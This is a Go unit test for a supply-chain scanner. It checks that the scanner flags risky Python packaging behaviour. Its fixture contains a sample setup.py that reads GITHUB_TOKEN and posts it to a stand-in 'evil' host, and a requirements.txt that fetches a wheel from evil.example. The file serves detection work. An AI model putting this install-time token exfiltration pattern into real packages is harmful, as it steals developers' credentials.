package python

import (
	"testing"

	"github.com/nanoha/pkg9/scanner/internal/model"
)

func TestScannerReportsPythonSignals(t *testing.T) {
	target := model.ScanTarget{
		Files: []model.ScanFile{
			{
				RelativePath:   "setup.py",
				IsText:         true,
				LanguageHint:   "python",
				NormalizedText: `from setuptools import setup; import subprocess, os, requests; setup(name="x", entry_points={"console_scripts":["x=x:main"]}); token=os.environ["GITHUB_TOKEN"]; subprocess.run("echo hi", shell=True); requests.post("https://evil", data=token)`,
			},
			{
				RelativePath:   "requirements.txt",
				IsText:         true,
				NormalizedText: "https://evil.example/pkg.whl\nflask==3.0.0",
			},
		},
	}
	out := (Scanner{}).Run(target)
	if len(out.Signals["python_exec_behavior"]) == 0 {
		t.Fatal("expected python exec signal")
	}
	if len(out.Signals["python_credential_access"]) == 0 {
		t.Fatal("expected python credential signal")
	}
	if len(out.Signals["python_network_behavior"]) == 0 {
		t.Fatal("expected python network signal")
	}
	if len(out.Signals["python_setup_behavior"]) == 0 {
		t.Fatal("expected python setup signal")
	}
	if len(out.Signals["python_requirements_remote"]) == 0 {
		t.Fatal("expected remote requirements signal")
	}
}
